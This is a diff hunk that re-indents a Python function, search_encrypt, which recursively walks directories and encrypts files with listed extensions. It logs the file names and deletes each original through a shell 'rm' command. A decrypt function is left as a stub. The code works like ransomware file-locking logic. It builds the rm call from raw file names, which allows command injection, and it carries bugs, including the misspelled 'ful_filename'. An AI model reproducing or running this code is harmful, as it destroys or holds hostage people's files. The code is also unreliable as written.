@@ -22,24 +22,24 @@ enc_dec_dict = {}
 
 
 def search_encrypt(dirname):
-   global enc_name, serial_number
-   try:
-      filenames = os.listdir(dirname)
-      for filename in filenames:
-         full_filename = os.path.join(dirname, filename)
-         if os.path.isdir(full_filename):
-            search_encrypt(full_filename)
-         else:
-            outfile_name = dirname + "/" + enc_name_head + enc_name + serial_number + footer
-            ext = os.path.splitext(ful_filename)[-1]
-            if (ext in extlist):
-               with open(logfilename, "a") as writefile:
-                  writefile.write(outfile_name + "|" + full_filename + "|" + "\n")
-               enc_module.encrypt_file(full_filename, outfile_name, password)
-               subprocess.getoutput("rm "+"'"+full_filename+"'")
-            serial_number = serial_number + 1
-   except PermissionError:
-      pass
+    global enc_name, serial_number
+    try:
+        filenames = os.listdir(dirname)
+        for filename in filenames:
+            full_filename = os.path.join(dirname, filename)
+            if os.path.isdir(full_filename):
+                search_encrypt(full_filename)
+            else:
+                outfile_name = dirname + "/" + enc_name_head + enc_name + serial_number + footer
+                ext = os.path.splitext(ful_filename)[-1]
+                if (ext in extlist):
+                    with open(logfilename, "a") as writefile:
+                        writefile.write(outfile_name + "|" + full_filename + "|" + "\n")
+                    enc_module.encrypt_file(full_filename, outfile_name, password)
+                    subprocess.getoutput("rm "+"'"+full_filename+"'")
+                serial_number = serial_number +1
+    except PermissionError:
+        pass
 
 def search_decrypt():
     return 0
